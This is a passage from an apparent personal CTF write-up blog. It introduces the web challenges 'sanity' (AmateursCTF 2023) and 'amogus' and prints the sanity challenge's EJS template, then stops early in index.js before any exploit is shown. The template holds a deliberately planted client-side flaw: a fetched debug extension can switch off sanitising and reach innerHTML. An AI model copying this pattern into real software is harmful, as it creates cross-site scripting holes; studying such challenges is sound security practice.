<!doctype html><html lang=en-us><head><title>Upsolving Suite: Web Workshop | flocto</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=generator content="Hugo 0.115.4"><link rel=canonical href=/writeups/2023/upsolving/upsolving-suite-1-web-workshop/><link href=/sass/main.min.c404f77850d7537fd75fd672eccb9290723f3f99d3b00709b78a731d5969ada8.css rel=stylesheet></head><body><div class=flexWrapper><header class=headerWrapper><div class=header><div><a href=/><span class=terminal>fl@cto ~ $</span></a></div><nav class=headerLinks><ul><li><a href=/about title>~/about</a></li><li><a href=/projects title>~/projects</a></li><li><a href=/writeups title>~/writeups</a></li><li><a href=/blog title>~/blog</a></li><li><a href=/ style=align-items:center;justify-content:center><img style=width:30px;height:30px;border-radius:15px;vertical-align:text-bottom src=/profile.png alt=Home></a></li></ul></nav></div></header><div class=content><main class=main><div class=postWrapper><h1>Upsolving Suite: Web Workshop</h1><ul class=tagList><li class=tagItem><a class=tagLink href=/tags/2023/>2023</a></li><li class=tagItem><a class=tagLink href=/tags/upsolve/>upsolve</a></li><li class=tagItem><a class=tagLink href=/tags/web/>web</a></li></ul><div><p>I&rsquo;ve been wanting to take a look back at web for a while now, since I felt like my progress has stagnated a bit. Two recent challenges, <a href=https://ctftime.org/task/25859>sanity from AmateursCTF 2023</a> and <a href=https://2023.imaginaryctf.org/Challenges>amogus from ImaginaryCTF 2023</a>, caught my eye.</p><p>I obviously couldn&rsquo;t solve <code>sanity</code> during the CTF since I was an organizer, and I was also unable to solve <code>amogus</code> during iCTF because of <del>skill issue</del>, so I decided to use this opportunity to try and upsolve them and get some practice in.</p><h2 id=sanity>sanity</h2><p>Anyway, let&rsquo;s first look at <code>sanity</code> from <code>amateursCTF</code>:</p><p><img src=/img/writeups/2023/upsolving/web-workshop-1/sanity.png alt="sanity description"></p><blockquote><p><a href=https://sanity.amt.rs/>https://sanity.amt.rs/</a></p><p><a href=https://amateurs-prod.storage.googleapis.com/uploads/5d96be137f2f905a22bf5802540c29aa4b4e23159ff5a3ea44e22d98cdebff2e/sanes.ejs>sanes.ejs</a> <a href=https://amateurs-prod.storage.googleapis.com/uploads/2da8d101e741c465a76159e2978160faea5bedb27f33366550597a509c9ed266/index.js>index.js</a></p></blockquote><h3 id=source>Source</h3><p>Looking at the source code, we don&rsquo;t have a whole lot going on:</p><p>filename=sanes.ejs</p><div class=highlight><div style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">38
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">39
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">40
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">41
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">42
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">43
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">44
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">45
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">46
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">47
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">48
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">49
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">50
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">51
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">52
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">53
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">54
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">55
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">56
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">57
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">58
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">59
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span><span style=color:#8a93a5;font-style:italic>&lt;!DOCTYPE html&gt;</span>
</span></span><span style=display:flex><span>&lt;<span style=color:#e06c75>html</span> <span style=color:#b3d23c>lang</span><span style=color:#c7bf54>=</span><span style=color:#98c379>&#34;en&#34;</span>&gt;
</span></span><span style=display:flex><span>&lt;<span style=color:#e06c75>head</span>&gt;
</span></span><span style=display:flex><span>    &lt;<span style=color:#e06c75>meta</span> <span style=color:#b3d23c>charset</span><span style=color:#c7bf54>=</span><span style=color:#98c379>&#34;UTF-8&#34;</span>&gt;
</span></span><span style=display:flex><span>    &lt;<span style=color:#e06c75>meta</span> <span style=color:#b3d23c>http-equiv</span><span style=color:#c7bf54>=</span><span style=color:#98c379>&#34;X-UA-Compatible&#34;</span> <span style=color:#b3d23c>content</span><span style=color:#c7bf54>=</span><span style=color:#98c379>&#34;IE=edge&#34;</span>&gt;
</span></span><span style=display:flex><span>    &lt;<span style=color:#e06c75>meta</span> <span style=color:#b3d23c>name</span><span style=color:#c7bf54>=</span><span style=color:#98c379>&#34;viewport&#34;</span> <span style=color:#b3d23c>content</span><span style=color:#c7bf54>=</span><span style=color:#98c379>&#34;width=device-width, initial-scale=1.0&#34;</span>&gt;
</span></span><span style=display:flex><span>    &lt;<span style=color:#e06c75>title</span>&gt;sanity - &lt;%= title %&gt;&lt;/<span style=color:#e06c75>title</span>&gt;
</span></span><span style=display:flex><span>&lt;/<span style=color:#e06c75>head</span>&gt;
</span></span><span style=display:flex><span>&lt;<span style=color:#e06c75>body</span>&gt;
</span></span><span style=display:flex><span>    &lt;<span style=color:#e06c75>h1</span> <span style=color:#b3d23c>id</span><span style=color:#c7bf54>=</span><span style=color:#98c379>&#34;title&#34;</span>&gt;
</span></span><span style=display:flex><span>        &lt;<span style=color:#e06c75>script</span>&gt;
</span></span><span style=display:flex><span>            <span style=color:#c678dd>const</span> <span style=color:#c1abea>sanitizer</span> <span style=color:#c7bf54>=</span> <span style=color:#c678dd>new</span> <span style=color:#c1abea>Sanitizer</span>();
</span></span><span style=display:flex><span>            <span style=color:#ef8383>document</span>.<span style=color:#c1abea>getElementById</span>(<span style=color:#63c381>&#34;title&#34;</span>).<span style=color:#c1abea>setHTML</span>(<span style=color:#ef8383>decodeURIComponent</span>(<span style=color:#98c379>`&lt;%- title %&gt;`</span>), { <span style=color:#c1abea>sanitizer</span> });
</span></span><span style=display:flex><span>        &lt;/<span style=color:#e06c75>script</span>&gt;
</span></span><span style=display:flex><span>    &lt;/<span style=color:#e06c75>h1</span>&gt;
</span></span><span style=display:flex><span>    &lt;<span style=color:#e06c75>div</span> <span style=color:#b3d23c>id</span><span style=color:#c7bf54>=</span><span style=color:#98c379>&#34;paste&#34;</span>&gt;
</span></span><span style=display:flex><span>        &lt;<span style=color:#e06c75>script</span>&gt;
</span></span><span style=display:flex><span>            <span style=color:#c678dd>class</span> <span style=color:#c1abea>Debug</span> {
</span></span><span style=display:flex><span>                #<span style=color:#c1abea>sanitize</span>;
</span></span><span style=display:flex><span>                <span style=color:#c1abea>constructor</span>(<span style=color:#c1abea>sanitize</span> <span style=color:#c7bf54>=</span> <span style=color:#b756ff;font-weight:700>true</span>) {
</span></span><span style=display:flex><span>                    <span style=color:#c678dd>this</span>.#<span style=color:#c1abea>sanitize</span> <span style=color:#c7bf54>=</span> <span style=color:#c1abea>sanitize</span>
</span></span><span style=display:flex><span>                }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                <span style=color:#c1abea>get</span> <span style=color:#c1abea>sanitize</span>() {
</span></span><span style=display:flex><span>                    <span style=color:#c678dd>return</span> <span style=color:#c678dd>this</span>.#<span style=color:#c1abea>sanitize</span>;
</span></span><span style=display:flex><span>                }
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#c678dd>async</span> <span style=color:#c678dd>function</span> <span style=color:#c1abea>loadBody</span>() {
</span></span><span style=display:flex><span>                <span style=color:#c678dd>let</span> <span style=color:#c1abea>extension</span> <span style=color:#c7bf54>=</span> <span style=color:#b756ff;font-weight:700>null</span>;
</span></span><span style=display:flex><span>                <span style=color:#c678dd>if</span> (<span style=color:#ef8383>window</span>.<span style=color:#c1abea>debug</span><span style=color:#c7bf54>?</span>.<span style=color:#c1abea>extension</span>) {
</span></span><span style=display:flex><span>                    <span style=color:#c678dd>let</span> <span style=color:#c1abea>res</span> <span style=color:#c7bf54>=</span> <span style=color:#c678dd>await</span> <span style=color:#c1abea>fetch</span>(<span style=color:#ef8383>window</span>.<span style=color:#c1abea>debug</span><span style=color:#c7bf54>?</span>.<span style=color:#c1abea>extension</span>.<span style=color:#c1abea>toString</span>());
</span></span><span style=display:flex><span>                    <span style=color:#c1abea>extension</span> <span style=color:#c7bf54>=</span> <span style=color:#c678dd>await</span> <span style=color:#c1abea>res</span>.<span style=color:#c1abea>json</span>();
</span></span><span style=display:flex><span>                }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                <span style=color:#c678dd>const</span> <span style=color:#c1abea>debug</span> <span style=color:#c7bf54>=</span> <span style=color:#ef8383>Object</span>.<span style=color:#c1abea>assign</span>(<span style=color:#c678dd>new</span> <span style=color:#c1abea>Debug</span>(<span style=color:#b756ff;font-weight:700>true</span>), <span style=color:#c1abea>extension</span> <span style=color:#c7bf54>??</span> { <span style=color:#c1abea>report</span><span style=color:#c7bf54>:</span> <span style=color:#b756ff;font-weight:700>true</span> });
</span></span><span style=display:flex><span>                <span style=color:#c678dd>let</span> <span style=color:#c1abea>body</span> <span style=color:#c7bf54>=</span> <span style=color:#ef8383>decodeURIComponent</span>(<span style=color:#98c379>`&lt;%- body %&gt;`</span>);
</span></span><span style=display:flex><span>                <span style=color:#c678dd>if</span> (<span style=color:#c1abea>debug</span>.<span style=color:#c1abea>report</span>) {
</span></span><span style=display:flex><span>                    <span style=color:#c678dd>const</span> <span style=color:#c1abea>reportLink</span> <span style=color:#c7bf54>=</span> <span style=color:#ef8383>document</span>.<span style=color:#c1abea>createElement</span>(<span style=color:#63c381>&#34;a&#34;</span>);
</span></span><span style=display:flex><span>                    <span style=color:#c1abea>reportLink</span>.<span style=color:#c1abea>innerHTML</span> <span style=color:#c7bf54>=</span> <span style=color:#98c379>`Report &lt;%= id %&gt;`</span>;
</span></span><span style=display:flex><span>                    <span style=color:#c1abea>reportLink</span>.<span style=color:#c1abea>href</span> <span style=color:#c7bf54>=</span> <span style=color:#98c379>`report/&lt;%= id %&gt;`</span>;
</span></span><span style=display:flex><span>                    <span style=color:#c1abea>reportLink</span>.<span style=color:#c1abea>style</span>.<span style=color:#c1abea>marginTop</span> <span style=color:#c7bf54>=</span> <span style=color:#63c381>&#34;1rem&#34;</span>;
</span></span><span style=display:flex><span>                    <span style=color:#c1abea>reportLink</span>.<span style=color:#c1abea>style</span>.<span style=color:#c1abea>display</span> <span style=color:#c7bf54>=</span> <span style=color:#63c381>&#34;block&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                    <span style=color:#ef8383>document</span>.<span style=color:#c1abea>body</span>.<span style=color:#c1abea>appendChild</span>(<span style=color:#c1abea>reportLink</span>)
</span></span><span style=display:flex><span>                }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>                <span style=color:#c678dd>if</span> (<span style=color:#c1abea>debug</span>.<span style=color:#c1abea>sanitize</span>) {
</span></span><span style=display:flex><span>                    <span style=color:#ef8383>document</span>.<span style=color:#c1abea>getElementById</span>(<span style=color:#63c381>&#34;paste&#34;</span>).<span style=color:#c1abea>setHTML</span>(<span style=color:#c1abea>body</span>, { <span style=color:#c1abea>sanitizer</span> })
</span></span><span style=display:flex><span>                } <span style=color:#c678dd>else</span> {
</span></span><span style=display:flex><span>                    <span style=color:#ef8383>document</span>.<span style=color:#c1abea>getElementById</span>(<span style=color:#63c381>&#34;paste&#34;</span>).<span style=color:#c1abea>innerHTML</span> <span style=color:#c7bf54>=</span> <span style=color:#c1abea>body</span>
</span></span><span style=display:flex><span>                }
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#c1abea>loadBody</span>();
</span></span><span style=display:flex><span>        &lt;/<span style=color:#e06c75>script</span>&gt;
</span></span><span style=display:flex><span>    &lt;/<span style=color:#e06c75>div</span>&gt;
</span></span><span style=display:flex><span>&lt;/<span style=color:#e06c75>body</span>&gt;
</span></span><span style=display:flex><span>&lt;/<span style=color:#e06c75>html</span>&gt;
</span></span></code></pre></td></tr></table></div></div><p>filename=index.js</p><div class=highlight><div style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">38
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">39
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">40
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">41
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">42
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">43
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">44
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">45
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">46
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">47
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">48
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">49
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">50
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">51
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">52
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">53
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">54
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">55
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">56
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">57
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">58
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">59
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">60
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">61
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">62
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">63
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">64
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">65
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">66
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">67
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">68
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">69
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">70
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">71
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">72
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">73
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">74
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">75
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">76
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">77
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">78
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">79
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">80
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">81
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">82
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#58626f">83
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#c678dd>import</span> <span style=color:#c1abea>express</span> <span style=color:#c1abea>from</span> <span style=color:#63c381>&#34;express&#34;</span>;
</span></span><span style=display:flex><span><span style=color:#c678dd>import</span> <span style=color:#c1abea>bodyParser</span> <span style=color:#c1abea>from</span> <span style=color:#63c381>&#34;body-parser&#34;</span>;
</span></span><span style=display:flex><span><span style=color:#c678dd>import</span> { <span style=color:#c1abea>nanoid</span> } <span style=color:#c1abea>from</span> <span style=color:#63c381>&#34;nanoid&#34;</span>;
</span></span><span style=display:flex><span><span style=color:#c678dd>import</span> <span style=color:#c1abea>path</span> <span style=color:#c1abea>from</span> <span style=color:#63c381>&#34;path&#34;</span>;
</span></span><span style=display:flex><span><span style=color:#c678dd>import</span> <span style=color:#c1abea>puppeteer</span> <span style=color:#c1abea>from</span> <span style=color:#63c381>&#34;puppeteer&#34;</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c678dd>const</span> <span style=color:#c1abea>sleep</span> <span style=color:#c7bf54>=</span> (<span style=color:#c1abea>ms</span>) =&gt; <span style=color:#c678dd>new</span> <span style=color:#ef8383>Promise</span>((<span style=color:#c1abea>res</span>) =&gt; <span style=color:#c1abea>setTimeout</span>(<span style=color:#c1abea>res</span>, <span style=color:#c1abea>ms</span>));
</span></span><span style=display:flex><span>
